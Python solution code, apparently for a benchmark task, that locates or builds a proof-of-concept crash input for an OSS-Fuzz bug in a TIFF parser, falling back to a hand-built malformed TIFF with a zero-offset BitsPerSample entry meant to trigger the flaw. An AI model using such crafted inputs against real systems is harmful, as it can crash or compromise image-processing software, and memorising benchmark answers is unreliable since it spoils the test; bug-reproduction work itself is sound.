import os
import tarfile
import zipfile
import re
from typing import Optional


class Solution:
    BUG_ID = "388571282"
    TARGET_LEN = 162

    def solve(self, src_path: str) -> bytes:
        data: Optional[bytes] = None

        if os.path.isdir(src_path):
            data = self._find_poc_in_dir(src_path)
            if data is None:
                data = self._find_poc_from_c_array_in_dir(src_path)
        else:
            if zipfile.is_zipfile(src_path):
                data = self._find_poc_in_zip(src_path)
                if data is None:
                    data = self._find_poc_from_c_array_in_zip(src_path)
            elif tarfile.is_tarfile(src_path):
                data = self._find_poc_in_tar(src_path)
                if data is None:
                    data = self._find_poc_from_c_array_in_tar(src_path)
            else:
                if os.path.exists(src_path) and os.path.isdir(src_path):
                    data = self._find_poc_in_dir(src_path)
                    if data is None:
                        data = self._find_poc_from_c_array_in_dir(src_path)

        if data is not None:
            return data

        return self._build_synthetic_poc()

    # ---------- Binary PoC file discovery ----------

    def _score_candidate(self, name: str, size: int) -> int:
        name_lower = name.lower()
        base = 0
        _, ext = os.path.splitext(name_lower)

        if ext in (".tif", ".tiff"):
            base += 100
        if self.BUG_ID in name_lower:
            base += 1000
        if "oss" in name_lower and "fuzz" in name_lower:
            base += 300
        if "clusterfuzz" in name_lower:
            base += 200
        if "poc" in name_lower or "crash" in name_lower:
            base += 150
        if any(word in name_lower for word in ("regress", "test", "fuzz", "corpus", "case", "inputs")):
            base += 50

        closeness_bonus = max(0, 100 - abs(size - self.TARGET_LEN))
        base += closeness_bonus

        return base

    def _find_poc_in_tar(self, tar_path: str) -> Optional[bytes]:
        best_name = None
        best_score = 0

        try:
            with tarfile.open(tar_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    size = member.size
                    if size <= 0 or size > 1_000_000:
                        continue
                    name = member.name
                    score = self._score_candidate(name, size)
                    if score > best_score:
                        best_score = score
                        best_name = name
        except Exception:
            return None

        if best_name is None or best_score < 300:
            return None

        try:
            with tarfile.open(tar_path, "r:*") as tar:
                try:
                    member = tar.getmember(best_name)
                except KeyError:
                    return None
                f = tar.extractfile(member)
                if f is None:
                    return None
                return f.read()
        except Exception:
            return None

    def _find_poc_in_zip(self, zip_path: str) -> Optional[bytes]:
        best_name = None
        best_score = 0

        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                for info in zf.infolist():
                    filename = info.filename
                    if filename.endswith("/"):
                        continue
                    size = info.file_size
                    if size <= 0 or size > 1_000_000:
                        continue
                    score = self._score_candidate(filename, size)
                    if score > best_score:
                        best_score = score
                        best_name = filename
        except Exception:
            return None

        if best_name is None or best_score < 300:
            return None

        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                with zf.open(best_name, "r") as f:
                    return f.read()
        except Exception:
            return None

    def _find_poc_in_dir(self, root: str) -> Optional[bytes]:
        best_path = None
        best_score = 0

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0 or size > 1_000_000:
                    continue
                score = self._score_candidate(path, size)
                if score > best_score:
                    best_score = score
                    best_path = path

        if best_path is None or best_score < 300:
            return None

        try:
            with open(best_path, "rb") as f:
                return f.read()
        except OSError:
            return None

    # ---------- C-array PoC discovery ----------

    def _extract_c_array_near_bug(self, text: str, bug_id: str) -> (Optional[bytes], int):
        bug_pos = text.find(bug_id)
        if bug_pos < 0:
            return None, 0

        pattern = re.compile(
            r"(?:static\s+)?(?:const\s+)?"
            r"(?:unsigned\s+char|uint8_t|char)\s+"
            r"\w+\s*\[\s*\]\s*=\s*\{([^}]*)\}",
            re.S,
        )

        best_data = None
        best_score = 0

        for m in pattern.finditer(text):
            content = m.group(1)
            numbers = re.findall(r"0x[0-9A-Fa-f]+|\d+", content)
            if not numbers:
                continue
            vals = []
            try:
                for n in numbers:
                    if n.lower().startswith("0x"):
                        v = int(n, 16)
                    else:
                        v = int(n, 10)
                    if 0 <= v <= 255:
                        vals.append(v)
                    else:
                        vals.append(v & 0xFF)
            except ValueError:
                continue

            if not vals:
                continue

            data = bytes(vals)
            length = len(data)

            dist_pos = abs(m.start() - bug_pos)
            pos_score = max(0, 1000 - dist_pos // 10)
            len_score = max(0, 200 - abs(length - self.TARGET_LEN) * 10)
            total_score = pos_score + len_score

            if total_score > best_score:
                best_score = total_score
                best_data = data

        return best_data, best_score

    def _find_poc_from_c_array_in_tar(self, tar_path: str) -> Optional[bytes]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        best_data = None
        best_score = 0

        try:
            with tarfile.open(tar_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name
                    _, ext = os.path.splitext(name.lower())
                    if ext not in exts:
                        continue
                    size = member.size
                    if size > 1_000_000:
                        continue
                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    try:
                        content = f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if self.BUG_ID not in content:
                        continue
                    data, score = self._extract_c_array_near_bug(content, self.BUG_ID)
                    if data is not None and score > best_score:
                        best_score = score
                        best_data = data
        except Exception:
            return None

        return best_data

    def _find_poc_from_c_array_in_zip(self, zip_path: str) -> Optional[bytes]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        best_data = None
        best_score = 0

        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                for info in zf.infolist():
                    filename = info.filename
                    if filename.endswith("/"):
                        continue
                    _, ext = os.path.splitext(filename.lower())
                    if ext not in exts:
                        continue
                    if info.file_size > 1_000_000:
                        continue
                    try:
                        with zf.open(info, "r") as f:
                            content = f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if self.BUG_ID not in content:
                        continue
                    data, score = self._extract_c_array_near_bug(content, self.BUG_ID)
                    if data is not None and score > best_score:
                        best_score = score
                        best_data = data
        except Exception:
            return None

        return best_data

    def _find_poc_from_c_array_in_dir(self, root: str) -> Optional[bytes]:
        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
        best_data = None
        best_score = 0

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                _, ext = os.path.splitext(fname.lower())
                if ext not in exts:
                    continue
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size > 1_000_000:
                    continue
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except OSError:
                    continue
                if self.BUG_ID not in content:
                    continue
                data, score = self._extract_c_array_near_bug(content, self.BUG_ID)
                if data is not None and score > best_score:
                    best_score = score
                    best_data = data

        return best_data

    # ---------- Synthetic fallback PoC ----------

    def _build_synthetic_poc(self) -> bytes:
        first_ifd_offset = 8
        num_entries = 6
        strip_data_offset = first_ifd_offset + 2 + num_entries * 12 + 4

        data = bytearray()
        data += b"II"
        data += (42).to_bytes(2, "little")
        data += first_ifd_offset.to_bytes(4, "little")

        data += num_entries.to_bytes(2, "little")

        def add_ifd_entry(tag: int, type_: int, count: int, value_or_offset: int) -> None:
            data.extend(tag.to_bytes(2, "little"))
            data.extend(type_.to_bytes(2, "little"))
            data.extend(count.to_bytes(4, "little"))
            data.extend(value_or_offset.to_bytes(4, "little"))

        # Basic image tags
        add_ifd_entry(256, 3, 1, 1)  # ImageWidth = 1
        add_ifd_entry(257, 3, 1, 1)  # ImageLength = 1

        # Offline tag with value offset 0 to trigger the bug
        add_ifd_entry(258, 3, 3, 0)  # BitsPerSample, 3 SHORTs, offset = 0

        # Compression = 1 (no compression)
        add_ifd_entry(259, 3, 1, 1)

        # StripOffsets: single strip, data after IFD
        add_ifd_entry(273, 4, 1, strip_data_offset)

        # StripByteCounts: 1 byte
        add_ifd_entry(279, 4, 1, 1)

        # Next IFD offset = 0
        data.extend((0).to_bytes(4, "little"))

        if len(data) < strip_data_offset:
            data.extend(b"\x00" * (strip_data_offset - len(data)))

        data.append(0)  # one byte of image data
        return bytes(data)